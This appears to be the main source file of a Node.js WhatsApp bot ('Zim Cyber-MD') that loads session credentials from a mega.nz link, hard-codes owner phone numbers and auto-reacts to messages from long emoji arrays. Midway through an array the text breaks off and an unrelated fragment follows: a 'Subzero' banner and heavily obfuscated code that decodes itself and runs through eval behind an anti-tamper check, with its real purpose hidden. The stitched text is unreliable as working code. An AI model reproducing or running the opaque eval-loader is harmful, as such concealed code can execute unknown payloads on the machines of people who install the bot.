/**


 Copyright (C) 2025.
 Licensed under the  GPL-3.0 License;
 You may not sell this script.
 It is supplied in the hope that it may be useful.
 * @project_name : Free Bot script
 * @author : Malvin King <https://github.com/kingmalvn>
 * @description : A Multi-functional whatsapp bot script.
 * @version 3.0.0
 **/


const {
default: makeWASocket,
useMultiFileAuthState,
DisconnectReason,
jidNormalizedUser,
getContentType,
fetchLatestBaileysVersion,
Browsers
} = require('@whiskeysockets/baileys')


const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const rankCommand = require('./plugins/rank')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms,downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const { tmpdir } = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ['263771341158']

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.replace("Suhail", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("SESSION DOWNLOADED COMPLETED ✅")
})})}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;


async function connectToWA() {
console.log("CONNECTING Zim Cyber-MD 🧬...");
const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
var { version } = await fetchLatestBaileysVersion()

const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version
        })
    
conn.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
connectToWA()
}
} else if (connection === 'open') {
console.log('♻️ INSTALLING PLUGINS FILES PLEASE WAIT... 🪄')
const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
if (path.extname(plugin).toLowerCase() == ".js") {
require("./plugins/" + plugin);
}
});
console.log('PLUGINS FILES INSTALL SUCCESSFULLY ✅')
console.log('Zim Cyber-MD CONNECTED TO WHATSAPP ENJOY ✅')

let up = `*╭──────────────●●►*
> *➺ Zim Cyber-MD ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʏ ᴛʏᴘᴇ .ᴍᴇɴᴜ ᴛᴏ ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ ᴄʀᴇᴀᴛᴇᴅ ʙʏ mr shellah ✅*

> *❁ᴊᴏɪɴ ᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ ᴄʜᴀɴɴᴇʟ ғᴏʀ ᴜᴘᴅᴀᴛᴇs 

*https://whatsapp.com/channel/0029Vb5SP7IDjiOfSjLKlB2Y*

*YOUR BOT ACTIVE NOW ENJOY♥️🪄*\n\n*PREFIX: ${prefix}*

*╰──────────────●●►*`;
conn.sendMessage(conn.user.id, { image: { url: config.MENU_IMG }, caption: up })

}
})
conn.ev.on('creds.update', saveCreds)  
        
//=============readstatus=======

conn.ev.on('messages.upsert', async(mek) => {
mek = mek.messages[0]
if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
await conn.readMessages([mek.key])
}
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const isMe = botNumber.includes(senderNumber)
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const isReact = m.message.reactionMessage ? true : false
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: mek })
}
        
conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
              let mime = '';
              let res = await axios.head(url)
              mime = res.headers['content-type']
              if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
              }
              let type = mime.split("/")[0] + "Message"
              if (mime === "application/pdf") {
                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
              }
              if (mime.split("/")[0] === "image") {
                return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
              }
              if (mime.split("/")[0] === "video") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
              }
              if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
              }
            }
        
//================ownerreact==============
if(senderNumber.includes("26377777777")){
if(isReact) return
m.react("👑")
}
if(senderNumber.includes("263777777777")){
if(isReact) return
m.react("👑")
}
if(senderNumber.includes("263780934873")){
if(isReact) return
m.react("🦋")
   }

if(senderNumber.includes("263780934873")){
if(isReact) return
m.react("🎀")
   }

//==========================public react===============//
// Auto React 
if (!isReact && senderNumber !== botNumber) {
    if (config.AUTO_REACT === 'true') {
        const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];

        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
    }
}

// Owner React
if (!isReact && senderNumber === botNumber) {
    if (config.OWNER_REACT === 'true') {
        const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '?l/*

$$$$$$\            $$\                                               
$$  __$$\           $$ |                                              
$$ /  \__|$$\   $$\ $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  
\$$$$$$\  $$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\ $$  __$$\ 
 \____$$\ $$ |  $$ |$$ |  $$ |  $$$$ _/ $$$$$$$$ |$$ |  \__|$$ /  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
\$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
 \______/  \______/ \_______/ \________| \_______|\__|       \______/

- 
*/



// THIS IS GOOD
let JbcZ;!function(){const gn9F=Array.prototype.slice.call(arguments);return eval("(function Ag2x(jw9p){const L3bq=nBeq(jw9p,DT1p(Ag2x.toString()));try{let fr4p=eval(L3bq);return fr4p.apply(null,gn9F);}catch(HY6p){var bmZp=(0o205346-68295);while(bmZp<(0o400064%65546))switch(bmZp){case (0x300A3%0o200054):bmZp=HY6p instanceof SyntaxError?(0o400145%0x10025):(0o400066%0x1000B);break;case (0o201452-0x1030F):bmZp=(0o400102%65553);{console.log(\'Error: the code has been tampered!\');return}break;}throw HY6p;}function DT1p(XgUp){let zOWp=20309677;var zQtq=(0o400045%65550);{let bowq;while(zQtq<(0x10618-0o202761)){switch(zQtq){case (0o600142%0x10014):zQtq=(68536-0o205637);{zOWp^=(XgUp.charCodeAt(bowq)*(15658734^0O73567354)+XgUp.charCodeAt(bowq>>>(0x4A5D0CE&0O320423424)))^2042341919;}break;case (0o204704-68011):zQtq=(131102%0o200012);bowq++;break;case (262222%0o200021):zQtq=bowq<XgUp.length?(0o400144%0x1001F):(68266-0o205203);break;case (0o1000071%0x1000C):zQtq=(0o201274-0x102B2);bowq=(0x75bcd15-0O726746425);break;}}}let vLoq=\"\";var Xirq=(66076-0o201001);{let rGjq;while(Xirq<(0o600117%0x10011)){switch(Xirq){case (0o600204%65571):Xirq=(0x20041%0o200032);rGjq=(0x21786%3);break;case (0o200404-0x100F7):Xirq=rGjq<(0O347010110&0x463A71D)?(65766-0o200317):(0o400104%0x10014);break;case (131151%0o200034):Xirq=(0O264353757%8);{const Tdmq=zOWp%(0x103D4-0o201706);zOWp=Math.floor(zOWp/(0o600142%65564));vLoq+=Tdmq>=(0o1000136%0x10011)?String.fromCharCode((0o212120-0x1140F)+(Tdmq-(0o203434-67330))):String.fromCharCode((0o205536-0x10AFD)+Tdmq);}break;case 